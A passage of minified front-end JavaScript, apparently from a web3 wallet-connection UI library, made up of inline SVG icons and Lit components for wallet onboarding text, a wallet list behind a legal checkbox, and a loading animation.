      d="M52.1 47.34c0-4.24-1.44-9.55-5.9-12.4a2.86 2.86 0 0 0-1.6-3.89v-.82c0-1.19-.52-2.26-1.35-3a4.74 4.74 0 0 0-2.4-6.26v-5.5a11.31 11.31 0 1 0-22.63 0v2.15a3.34 3.34 0 0 0-1.18 5.05 4.74 4.74 0 0 0-.68 6.44A5.22 5.22 0 0 0 14 35.92c-3.06 4.13-6.1 8.3-6.1 15.64 0 2.67.37 4.86.74 6.39a20.3 20.3 0 0 0 .73 2.39l.02.04v.01l.92-.39-.92.4.26.6h38.26l.3-.49-.87-.51.86.5.02-.01.03-.07a16.32 16.32 0 0 0 .57-1.05c.36-.72.85-1.74 1.33-2.96a25.51 25.51 0 0 0 1.94-9.07Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M26.5 29.5c-3-.5-5.5-3-5.5-7v-7c0-.47 0-.7.03-.9a3 3 0 0 1 2.58-2.57c.2-.03.42-.03.89-.03 2 0 2.5-2.5 2.5-2.5s0 2.5 2.5 2.5c1.4 0 2.1 0 2.65.23a3 3 0 0 1 1.62 1.62c.23.55.23 1.25.23 2.65v6c0 4-3 7-6.5 7 1.35.23 4 0 6.5-2v9.53C34 38.5 31.5 40 28 40s-6-1.5-6-2.97L24 34l2.5 1.5v-6ZM26 47h4.5c2.5 0 3 4 3 5.5h-3l-1-1.5H26v-4Zm-6.25 5.5H24V57h-8c0-1 1-4.5 3.75-4.5Z"
      clip-rule="evenodd"
    />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="3" /></clipPath>
  </defs>
</svg> `,LDe=Mt`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#794CFF" rx="3" />
  <path
    fill="#987DE8"
    stroke="#fff"
    stroke-width="2"
    d="M33 22.5v-1H16v5H8.5V36H13v-5h3v7.5h17V31h1v7.5h17v-17H34v5h-1v-4Z"
  />
  <path fill="#fff" d="M37.5 25h10v10h-10z" />
  <path fill="#4019B2" d="M42.5 25h5v10h-5z" />
  <path fill="#fff" d="M19.5 25h10v10h-10z" />
  <path fill="#4019B2" d="M24.5 25h5v10h-5z" />
  <path fill="#fff" d="M12 30.5h4V37h-4v-6.5Z" />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,FDe=Mt`<svg width="60" height="60" viewBox="0 0 60 60" fill="none">
<g clip-path="url(#clip0_13859_31161)">
  <path d="M0 24.8995C0 15.6481 0 11.0223 1.97053 7.56763C3.3015 5.2342 5.23468 3.30101 7.56812 1.97004C11.0228 -0.000488281 15.6485 -0.000488281 24.9 -0.000488281H35.1C44.3514 -0.000488281 48.9772 -0.000488281 52.4319 1.97004C54.7653 3.30101 56.6985 5.2342 58.0295 7.56763C60 11.0223 60 15.6481 60 24.8995V35.0995C60 44.351 60 48.9767 58.0295 52.4314C56.6985 54.7648 54.7653 56.698 52.4319 58.029C48.9772 59.9995 44.3514 59.9995 35.1 59.9995H24.9C15.6485 59.9995 11.0228 59.9995 7.56812 58.029C5.23468 56.698 3.3015 54.7648 1.97053 52.4314C0 48.9767 0 44.351 0 35.0995V24.8995Z" fill="#EB8B47"/>
  <path d="M0.5 24.8995C0.5 20.2647 0.50047 16.8216 0.744315 14.1045C0.987552 11.3941 1.46987 9.45455 2.40484 7.81536C3.69145 5.55971 5.56019 3.69096 7.81585 2.40435C9.45504 1.46938 11.3946 0.987064 14.105 0.743826C16.8221 0.499981 20.2652 0.499512 24.9 0.499512H35.1C39.7348 0.499512 43.1779 0.499981 45.895 0.743826C48.6054 0.987064 50.545 1.46938 52.1841 2.40435C54.4398 3.69096 56.3086 5.55971 57.5952 7.81536C58.5301 9.45455 59.0124 11.3941 59.2557 14.1045C59.4995 16.8216 59.5 20.2647 59.5 24.8995V35.0995C59.5 39.7343 59.4995 43.1774 59.2557 45.8945C59.0124 48.6049 58.5301 50.5445 57.5952 52.1837C56.3086 54.4393 54.4398 56.3081 52.1841 57.5947C50.545 58.5296 48.6054 59.012 45.895 59.2552C43.1779 59.499 39.7348 59.4995 35.1 59.4995H24.9C20.2652 59.4995 16.8221 59.499 14.105 59.2552C11.3946 59.012 9.45504 58.5296 7.81585 57.5947C5.56019 56.3081 3.69145 54.4393 2.40484 52.1837C1.46987 50.5445 0.987552 48.6049 0.744315 45.8945C0.50047 43.1774 0.5 39.7343 0.5 35.0995V24.8995Z" stroke="#141414" stroke-opacity="0.1"/>
  <path d="M13 26.0335C13 21.7838 13 19.659 14.0822 18.1694C14.4318 17.6883 14.8548 17.2653 15.3359 16.9157C16.8255 15.8335 18.9503 15.8335 23.2 15.8335H36.8C41.0497 15.8335 43.1745 15.8335 44.6641 16.9157C45.1452 17.2653 45.5682 17.6883 45.9178 18.1694C47 19.659 47 21.7838 47 26.0335V33.9668C47 38.2165 47 40.3414 45.9178 41.831C45.5682 42.312 45.1452 42.7351 44.6641 43.0846C43.1745 44.1668 41.0497 44.1668 36.8 44.1668H23.2C18.9503 44.1668 16.8255 44.1668 15.3359 43.0846C14.8548 42.7351 14.4318 42.312 14.0822 41.831C13 40.3414 13 38.2165 13 33.9668V26.0335Z" fill="#FF974C" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
  <path d="M39.5 36.667H36.6666" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
  <path d="M45.2 23.0645H14.8C14.0501 23.0645 13.6751 23.0645 13.4122 23.2554C13.3273 23.3171 13.2527 23.3918 13.191 23.4767C13 23.7395 13 24.1145 13 24.8645V27.2645C13 28.0144 13 28.3894 13.191 28.6522C13.2527 28.7371 13.3273 28.8118 13.4122 28.8735C13.6751 29.0645 14.0501 29.0645 14.8 29.0645H45.2C45.9499 29.0645 46.3249 29.0645 46.5878 28.8735C46.6727 28.8118 46.7473 28.7371 46.809 28.6522C47 28.3894 47 28.0144 47 27.2645V24.8645C47 24.1145 47 23.7395 46.809 23.4767C46.7473 23.3918 46.6727 23.3171 46.5878 23.2554C46.3249 23.0645 45.9499 23.0645 45.2 23.0645Z" fill="white" fill-opacity="0.4" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<defs>
  <clipPath id="clip0_13859_31161">
    <rect width="60" height="60" fill="white"/>
  </clipPath>
</defs>
</svg>`,$De=Mt`<svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
  <g clip-path="url(#clip0_241_31635)">
    <path d="M0 26.5595C0 16.6913 0 11.7572 2.1019 8.07217C3.5216 5.58317 5.58366 3.52111 8.07266 2.10141C11.7577 -0.000488281 16.6918 -0.000488281 26.56 -0.000488281H37.44C47.3082 -0.000488281 52.2423 -0.000488281 55.9273 2.10141C58.4163 3.52111 60.4784 5.58317 61.8981 8.07217C64 11.7572 64 16.6913 64 26.5595V37.4395C64 47.3077 64 52.2418 61.8981 55.9268C60.4784 58.4158 58.4163 60.4779 55.9273 61.8976C52.2423 63.9995 47.3082 63.9995 37.44 63.9995H26.56C16.6918 63.9995 11.7577 63.9995 8.07266 61.8976C5.58366 60.4779 3.5216 58.4158 2.1019 55.9268C0 52.2418 0 47.3077 0 37.4395V26.5595Z" fill="#EB8B47"/>
    <path d="M0.5 26.5595C0.5 21.6163 0.50047 17.942 0.760736 15.0418C1.02039 12.1485 1.53555 10.0742 2.53621 8.3199C3.91155 5.90869 5.90917 3.91106 8.32039 2.53572C10.0747 1.53506 12.1489 1.01991 15.0423 0.760247C17.9425 0.499981 21.6168 0.499512 26.56 0.499512H37.44C42.3832 0.499512 46.0575 0.499981 48.9577 0.760247C51.8511 1.01991 53.9253 1.53506 55.6796 2.53572C58.0908 3.91106 60.0885 5.90869 61.4638 8.3199C62.4645 10.0742 62.9796 12.1485 63.2393 15.0418C63.4995 17.942 63.5 21.6163 63.5 26.5595V37.4395C63.5 42.3827 63.4995 46.057 63.2393 48.9572C62.9796 51.8506 62.4645 53.9248 61.4638 55.6791C60.0885 58.0903 58.0908 60.088 55.6796 61.4633C53.9253 62.464 51.8511 62.9791 48.9577 63.2388C46.0575 63.499 42.3832 63.4995 37.44 63.4995H26.56C21.6168 63.4995 17.9425 63.499 15.0423 63.2388C12.1489 62.9791 10.0747 62.464 8.32039 61.4633C5.90917 60.088 3.91155 58.0903 2.53621 55.6791C1.53555 53.9248 1.02039 51.8506 0.760736 48.9572C0.50047 46.057 0.5 42.3827 0.5 37.4395V26.5595Z" stroke="#141414" stroke-opacity="0.1"/>
    <path d="M28.1042 49.2329L13.1024 51.2077L15.0772 36.2059L37.1015 14.1815C39.2441 12.039 40.3154 10.9677 41.5718 10.624C42.4205 10.3918 43.3159 10.3918 44.1645 10.624C45.421 10.9677 46.4922 12.039 48.6348 14.1815L50.1286 15.6753C52.2711 17.8179 53.3424 18.8891 53.6861 20.1456C53.9183 20.9942 53.9183 21.8896 53.6861 22.7383C53.3424 23.9947 52.2711 25.066 50.1286 27.2086L28.1042 49.2329Z" fill="#FF974C" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M38.5962 20.5376L22.4199 36.7139" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M43.7727 25.714L27.5964 41.8903" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M22.3703 36.7635C19.3258 39.808 16.0198 36.6395 16.2616 35.0324" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M27.5466 41.9399C24.5034 44.9831 28.155 48.7098 29.2738 48.0475" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M27.5468 41.9398C23.428 46.0586 18.2516 40.8822 22.3704 36.7634" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M15.8191 50.5214C15.4711 49.5823 14.728 48.8392 13.7889 48.4912" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M49.2862 29.5805L34.7275 15.0219" stroke="#E4E7E7" stroke-width="2" stroke-linejoin="round"/>
  </g>
  <defs>
    <clipPath id="clip0_241_31635">
      <rect width="64" height="64" fill="white"/>
    </clipPath>
  </defs>
</svg>
`,HDe=Mt`<svg
  viewBox="0 0 60 60"
  fill="none"
>
  <g clip-path="url(#1)">
    <rect width="60" height="60" rx="30" fill="#00ACE6" />
    <path
      d="M59 73C59 89.0163 46.0163 102 30 102C13.9837 102 1 89.0163 1 73C1 56.9837 12 44 30 44C48 44 59 56.9837 59 73Z"
      fill="#1AC6FF"
      stroke="white"
      stroke-width="2"
    />
    <path
      d="M18.6904 19.9015C19.6264 15.3286 23.3466 11.8445 27.9708 11.2096C29.3231 11.024 30.6751 11.0238 32.0289 11.2096C36.6532 11.8445 40.3733 15.3286 41.3094 19.9015C41.4868 20.7681 41.6309 21.6509 41.7492 22.5271C41.8811 23.5041 41.8811 24.4944 41.7492 25.4715C41.6309 26.3476 41.4868 27.2304 41.3094 28.097C40.3733 32.6699 36.6532 36.154 32.0289 36.7889C30.6772 36.9744 29.3216 36.9743 27.9708 36.7889C23.3466 36.154 19.6264 32.6699 18.6904 28.097C18.513 27.2304 18.3689 26.3476 18.2506 25.4715C18.1186 24.4944 18.1186 23.5041 18.2506 22.5271C18.3689 21.6509 18.513 20.7681 18.6904 19.9015Z"
      fill="#1AC6FF"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="24.5" cy="23.5" r="1.5" fill="white" />
    <circle cx="35.5" cy="23.5" r="1.5" fill="white" />
    <path
      d="M31 20L28 28H32"
      stroke="white"
      stroke-width="2"
      stroke-linecap="round"
      stroke-linejoin="round"
    />
  </g>
  <rect x="0.5" y="0.5" width="59" height="59" rx="29.5" stroke="white" stroke-opacity="0.1" />
  <defs>
    <clipPath id="1">
      <rect width="60" height="60" rx="30" fill="white" />
    </clipPath>
  </defs>
</svg> `,zDe=Mt`<svg fill="none" viewBox="0 0 80 80">
  <g clip-path="url(#a)">
    <path fill="url(#b)" d="M40 80a40 40 0 1 0 0-80 40 40 0 0 0 0 80Z" />
    <path
      stroke="#fff"
      stroke-opacity=".1"
      d="M79.5 40a39.5 39.5 0 1 1-79 0 39.5 39.5 0 0 1 79 0Z"
    />
    <path
      fill="#fff"
      d="m62.62 51.54-7.54 7.91a1.75 1.75 0 0 1-1.29.55H18.02a.9.9 0 0 1-.8-.52.84.84 0 0 1 .16-.92l7.55-7.92a1.75 1.75 0 0 1 1.28-.55h35.77a.87.87 0 0 1 .8.52.84.84 0 0 1-.16.93Zm-7.54-15.95a1.75 1.75 0 0 0-1.29-.54H18.02a.89.89 0 0 0-.8.51.84.84 0 0 0 .16.93l7.55 7.92a1.75 1.75 0 0 0 1.28.54h35.77a.89.89 0 0 0 .8-.51.84.84 0 0 0-.16-.93l-7.54-7.92ZM18.02 29.9h35.77a1.79 1.79 0 0 0 1.29-.54l7.54-7.92a.85.85 0 0 0 .16-.93.87.87 0 0 0-.8-.51H26.21a1.79 1.79 0 0 0-1.28.54l-7.55 7.92a.85.85 0 0 0-.16.93.89.89 0 0 0 .8.52Z"
    />
  </g>
  <defs>
    <linearGradient id="b" x1="6.75" x2="80.68" y1="81.91" y2="7.37" gradientUnits="userSpaceOnUse">
      <stop offset=".08" stop-color="#9945FF" />
      <stop offset=".3" stop-color="#8752F3" />
      <stop offset=".5" stop-color="#5497D5" />
      <stop offset=".6" stop-color="#43B4CA" />
      <stop offset=".72" stop-color="#28E0B9" />
      <stop offset=".97" stop-color="#19FB9B" />
    </linearGradient>
    <clipPath id="a"><path fill="#fff" d="M0 0h80v80H0z" /></clipPath>
  </defs>
</svg> `,qDe=Mt`<svg viewBox="0 0 60 60" fill="none">
  <g clip-path="url(#1)">
    <path
      d="M0 24.9C0 15.6485 0 11.0228 1.97053 7.56812C3.3015 5.23468 5.23468 3.3015 7.56812 1.97053C11.0228 0 15.6485 0 24.9 0H35.1C44.3514 0 48.9772 0 52.4319 1.97053C54.7653 3.3015 56.6985 5.23468 58.0295 7.56812C60 11.0228 60 15.6485 60 24.9V35.1C60 44.3514 60 48.9772 58.0295 52.4319C56.6985 54.7653 54.7653 56.6985 52.4319 58.0295C48.9772 60 44.3514 60 35.1 60H24.9C15.6485 60 11.0228 60 7.56812 58.0295C5.23468 56.6985 3.3015 54.7653 1.97053 52.4319C0 48.9772 0 44.3514 0 35.1V24.9Z"
      fill="#794CFF"
    />
    <path
      d="M0.5 24.9C0.5 20.2652 0.50047 16.8221 0.744315 14.105C0.987552 11.3946 1.46987 9.45504 2.40484 7.81585C3.69145 5.56019 5.56019 3.69145 7.81585 2.40484C9.45504 1.46987 11.3946 0.987552 14.105 0.744315C16.8221 0.50047 20.2652 0.5 24.9 0.5H35.1C39.7348 0.5 43.1779 0.50047 45.895 0.744315C48.6054 0.987552 50.545 1.46987 52.1841 2.40484C54.4398 3.69145 56.3086 5.56019 57.5952 7.81585C58.5301 9.45504 59.0124 11.3946 59.2557 14.105C59.4995 16.8221 59.5 20.2652 59.5 24.9V35.1C59.5 39.7348 59.4995 43.1779 59.2557 45.895C59.0124 48.6054 58.5301 50.545 57.5952 52.1841C56.3086 54.4398 54.4398 56.3086 52.1841 57.5952C50.545 58.5301 48.6054 59.0124 45.895 59.2557C43.1779 59.4995 39.7348 59.5 35.1 59.5H24.9C20.2652 59.5 16.8221 59.4995 14.105 59.2557C11.3946 59.0124 9.45504 58.5301 7.81585 57.5952C5.56019 56.3086 3.69145 54.4398 2.40484 52.1841C1.46987 50.545 0.987552 48.6054 0.744315 45.895C0.50047 43.1779 0.5 39.7348 0.5 35.1V24.9Z"
      stroke="#062B2B"
      stroke-opacity="0.1"
    />
    <path
      d="M35.1403 31.5016C35.1193 30.9637 35.388 30.4558 35.8446 30.1707C36.1207 29.9982 36.4761 29.8473 36.7921 29.7685C37.3143 29.6382 37.8664 29.7977 38.2386 30.1864C38.8507 30.8257 39.3004 31.6836 39.8033 32.408C40.2796 33.0942 41.4695 33.2512 41.9687 32.5047C42.4839 31.7341 42.9405 30.8229 43.572 30.1399C43.9375 29.7447 44.4866 29.5756 45.0111 29.6967C45.3283 29.7701 45.6863 29.9147 45.9655 30.0823C46.4269 30.3595 46.7045 30.8626 46.6928 31.4008C46.6731 32.3083 46.3764 33.2571 46.2158 34.1473C46.061 35.0048 46.9045 35.8337 47.7592 35.664C48.6464 35.4878 49.5899 35.1747 50.497 35.1391C51.0348 35.1181 51.5427 35.3868 51.8279 35.8433C52.0004 36.1195 52.1513 36.4749 52.2301 36.7908C52.3604 37.3131 52.2009 37.8651 51.8121 38.2374C51.1729 38.8495 50.3151 39.2991 49.5908 39.8019C48.9046 40.2782 48.7473 41.4683 49.4939 41.9675C50.2644 42.4827 51.1757 42.9393 51.8587 43.5708C52.2539 43.9362 52.423 44.4854 52.3018 45.0099C52.2285 45.3271 52.0839 45.6851 51.9162 45.9642C51.6391 46.4257 51.1359 46.7032 50.5978 46.6916C49.6903 46.6719 48.7417 46.3753 47.8516 46.2146C46.9939 46.0598 46.1648 46.9035 46.3346 47.7583C46.5108 48.6454 46.8239 49.5888 46.8594 50.4958C46.8805 51.0336 46.6117 51.5415 46.1552 51.8267C45.879 51.9992 45.5236 52.15 45.2077 52.2289C44.6854 52.3592 44.1334 52.1997 43.7611 51.8109C43.1491 51.1718 42.6996 50.314 42.1968 49.5897C41.7203 48.9034 40.5301 48.7463 40.0309 49.493C39.5157 50.2634 39.0592 51.1746 38.4278 51.8574C38.0623 52.2527 37.5132 52.4218 36.9887 52.3006C36.6715 52.2273 36.3135 52.0826 36.0343 51.915C35.5729 51.6379 35.2953 51.1347 35.307 50.5966C35.3267 49.6891 35.6233 48.7405 35.7839 47.8505C35.9388 46.9928 35.0951 46.1636 34.2402 46.3334C33.3531 46.5096 32.4098 46.8227 31.5028 46.8582C30.9649 46.8793 30.457 46.6105 30.1719 46.154C29.9994 45.8778 29.8485 45.5224 29.7697 45.2065C29.6394 44.6842 29.7989 44.1322 30.1877 43.7599C30.8269 43.1479 31.6847 42.6982 32.4091 42.1954C33.0954 41.7189 33.2522 40.5289 32.5056 40.0297C31.7351 39.5145 30.824 39.058 30.1411 38.4265C29.7459 38.0611 29.5768 37.5119 29.698 36.9875C29.7713 36.6702 29.9159 36.3122 30.0836 36.0331C30.3607 35.5717 30.8638 35.2941 31.402 35.3058C32.3095 35.3255 33.2583 35.6221 34.1485 35.7828C35.006 35.9376 35.8349 35.094 35.6652 34.2393C35.489 33.3521 35.1759 32.4087 35.1403 31.5016Z"
      fill="#906EF7"
      stroke="white"
      stroke-width="2"
    />
    <path
      d="M20.7706 8.22357C20.9036 7.51411 21.5231 7 22.2449 7H23.7551C24.4769 7 25.0964 7.51411 25.2294 8.22357C25.5051 9.69403 25.4829 11.6321 27.1202 12.2606C27.3092 12.3331 27.4958 12.4105 27.6798 12.4926C29.2818 13.2072 30.6374 11.8199 31.8721 10.9752C32.4678 10.5676 33.2694 10.6421 33.7798 11.1525L34.8477 12.2204C35.3581 12.7308 35.4326 13.5323 35.025 14.128C34.1802 15.3627 32.7931 16.7183 33.5077 18.3202C33.5898 18.5043 33.6672 18.6909 33.7398 18.88C34.3683 20.5171 36.3061 20.4949 37.7764 20.7706C38.4859 20.9036 39 21.5231 39 22.2449V23.7551C39 24.4769 38.4859 25.0964 37.7764 25.2294C36.3061 25.5051 34.3685 25.483 33.7401 27.1201C33.6675 27.3093 33.59 27.4961 33.5079 27.6803C32.7934 29.282 34.1803 30.6374 35.025 31.8719C35.4326 32.4677 35.3581 33.2692 34.8477 33.7796L33.7798 34.8475C33.2694 35.3579 32.4678 35.4324 31.8721 35.0248C30.6376 34.1801 29.2823 32.7934 27.6806 33.508C27.4962 33.5903 27.3093 33.6678 27.12 33.7405C25.483 34.3688 25.5051 36.3062 25.2294 37.7764C25.0964 38.4859 24.4769 39 23.7551 39H22.2449C21.5231 39 20.9036 38.4859 20.7706 37.7764C20.4949 36.3062 20.517 34.3688 18.88 33.7405C18.6908 33.6678 18.5039 33.5903 18.3196 33.5081C16.7179 32.7936 15.3625 34.1804 14.1279 35.0251C13.5322 35.4327 12.7307 35.3582 12.2203 34.8478L11.1524 33.7799C10.642 33.2695 10.5675 32.4679 10.9751 31.8722C11.8198 30.6376 13.2067 29.2822 12.4922 27.6804C12.41 27.4962 12.3325 27.3093 12.2599 27.1201C11.6315 25.483 9.69392 25.5051 8.22357 25.2294C7.51411 25.0964 7 24.4769 7 23.7551V22.2449C7 21.5231 7.51411 20.9036 8.22357 20.7706C9.69394 20.4949 11.6317 20.5171 12.2602 18.88C12.3328 18.6909 12.4103 18.5042 12.4924 18.3201C13.207 16.7181 11.8198 15.3625 10.975 14.1278C10.5674 13.5321 10.6419 12.7305 11.1523 12.2201L12.2202 11.1522C12.7306 10.6418 13.5322 10.5673 14.1279 10.9749C15.3626 11.8197 16.7184 13.2071 18.3204 12.4925C18.5044 12.4105 18.6909 12.3331 18.8799 12.2606C20.5171 11.6321 20.4949 9.69403 20.7706 8.22357Z"
      fill="#906EF7"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="23" cy="23" r="6" fill="#794CFF" stroke="white" stroke-width="2" />
    <circle cx="41" cy="41" r="4" fill="#794CFF" stroke="white" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="1">
      <rect width="60" height="60" fill="white" />
    </clipPath>
  </defs>
</svg> `,VDe=mr`
  :host {
    display: block;
    width: var(--local-size);
    height: var(--local-size);
  }

  :host svg {
    width: 100%;
    height: 100%;
  }
`;var cj=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const WDe={browser:TDe,dao:xDe,defi:IDe,defiAlt:RDe,eth:PDe,layers:ODe,lock:DDe,login:BDe,network:MDe,nft:UDe,noun:LDe,profile:HDe,system:qDe,meld:jDe,onrampCard:FDe,google:NDe,pencil:$De,lightbulb:kDe,solana:zDe,ton:Nae,bitcoin:SDe};let __=class extends $e{constructor(){super(...arguments),this.name="browser",this.size="md"}render(){return this.style.cssText=`
       --local-size: var(--apkt-visual-size-${this.size});
   `,X`${WDe[this.name]}`}};__.styles=[Dt,VDe];cj([ie()],__.prototype,"name",void 0);cj([ie()],__.prototype,"size",void 0);__=cj([Ue("wui-visual")],__);var ice=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let X7=class extends $e{constructor(){super(...arguments),this.data=[]}render(){return X`
      <wui-flex flexDirection="column" alignItems="center" gap="4">
        ${this.data.map(e=>X`
            <wui-flex flexDirection="column" alignItems="center" gap="5">
              <wui-flex flexDirection="row" justifyContent="center" gap="1">
                ${e.images.map(n=>X`<wui-visual size="sm" name=${n}></wui-visual>`)}
              </wui-flex>
            </wui-flex>
            <wui-flex flexDirection="column" alignItems="center" gap="1">
              <wui-text variant="md-regular" color="primary" align="center">${e.title}</wui-text>
              <wui-text variant="sm-regular" color="secondary" align="center"
                >${e.text}</wui-text
              >
            </wui-flex>
          `)}
      </wui-flex>
    `}};ice([ie({type:Array})],X7.prototype,"data",void 0);X7=ice([Ue("w3m-help-widget")],X7);var GDe=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const KDe=[{images:["login","profile","lock"],title:"One login for all of web3",text:"Log in to any app by connecting your wallet. Say goodbye to countless passwords!"},{images:["defi","nft","eth"],title:"A home for your digital assets",text:"A wallet lets you store, send and receive digital assets like cryptocurrencies and NFTs."},{images:["browser","noun","dao"],title:"Your gateway to a new web",text:"With your wallet, you can explore and interact with DeFi, NFTs, DAOs, and much more."}];let eD=class extends $e{render(){return X`
      <wui-flex
        flexDirection="column"
        .padding=${["6","5","5","5"]}
        alignItems="center"
        gap="5"
      >
        <w3m-help-widget .data=${KDe}></w3m-help-widget>
        <wui-button variant="accent-primary" size="md" @click=${this.onGetWallet.bind(this)}>
          <wui-icon color="inherit" slot="iconLeft" name="wallet"></wui-icon>
          Get a wallet
        </wui-button>
      </wui-flex>
    `}onGetWallet(){tt.sendEvent({type:"track",event:"CLICK_GET_WALLET_HELP"}),we.push("GetWallet")}};eD=GDe([Ue("w3m-what-is-a-wallet-view")],eD);const ZDe=ot`
  wui-flex {
    max-height: clamp(360px, 540px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
    transition: opacity ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
    will-change: opacity;
  }
  wui-flex::-webkit-scrollbar {
    display: none;
  }
  wui-flex.disabled {
    opacity: 0.3;
    pointer-events: none;
    user-select: none;
  }
`;var sce=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let A_=class extends $e{constructor(){super(),this.unsubscribe=[],this.checked=Qm.state.isLegalCheckboxChecked,this.unsubscribe.push(Qm.subscribeKey("isLegalCheckboxChecked",e=>{this.checked=e}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{termsConditionsUrl:e,privacyPolicyUrl:n}=de.state,r=de.state.features?.legalCheckbox,s=!!(e||n)&&!!r,o=s&&!this.checked,a=o?-1:void 0;return X`
      <w3m-legal-checkbox></w3m-legal-checkbox>
      <wui-flex
        flexDirection="column"
        .padding=${s?["0","3","3","3"]:"3"}
        gap="2"
        class=${et(o?"disabled":void 0)}
      >
        <w3m-wallet-login-list tabIdx=${et(a)}></w3m-wallet-login-list>
      </wui-flex>
    `}};A_.styles=ZDe;sce([Ee()],A_.prototype,"checked",void 0);A_=sce([Ue("w3m-connect-wallets-view")],A_);const YDe=ot`
  :host {
    display: block;
    width: 120px;
    height: 120px;
  }

  svg {
    width: 120px;
    height: 120px;
    fill: none;
    stroke: transparent;
    stroke-linecap: round;
  }

  use {
    stroke: ${t=>t.colors.accent100};
    stroke-width: 2px;
    stroke-dasharray: 54, 118;
    stroke-dashoffset: 172;
    animation: dash 1s linear infinite;
  }

  @keyframes dash {
    to {
      stroke-dashoffset: 0px;
    }
  }
`;var QDe=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let tD=class extends $e{render(){return X`
      <svg viewBox="0 0 54 59">
        <path
          id="wui-loader-path"
          d="M17.22 5.295c3.877-2.277 5.737-3.363 7.72-3.726a11.44 11.44 0 0 1 4.12 0c1.983.363 3.844 1.45 7.72 3.726l6.065 3.562c3.876 2.276 5.731 3.372 7.032 4.938a11.896 11.896 0 0 1 2.06 3.63c.683 1.928.688 4.11.688 8.663v7.124c0 4.553-.005 6.735-.688 8.664a11.896 11.896 0 0 1-2.06 3.63c-1.3 1.565-3.156 2.66-7.032 4.937l-6.065 3.563c-3.877 2.276-5.737 3.362-7.72 3.725a11.46 11.46 0 0 1-4.12 0c-1.983-.363-3.844-1.449-7.72-3.726l-6.065-3.562c-3.876-2.276-5.731-3.372-7.032-4.938a11.885 11.885 0 0 1-2.06-3.63c-.682-1.928-.688-4.11-.688-8.663v-7.124c0-4.553.006-6.735.688-8.664a11.885 11.885 0 0 1 2.06-3.63c1.3-1.565 3.156-2.66 7.032-4.937l6.065-3.562Z"
        />
        <use xlink:href="#wui-loader-path"></use>
      </svg>
    `}};tD.styles=[Dt,YDe];tD=QDe([Ue("wui-loading-hexagon")],tD);const JDe=Mt`<svg width="86" height="96" fill="none">
  <path
    d="M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z"
  />
</svg>`,XDe=Mt`
  <svg fill="none" viewBox="0 0 36 40">
    <path
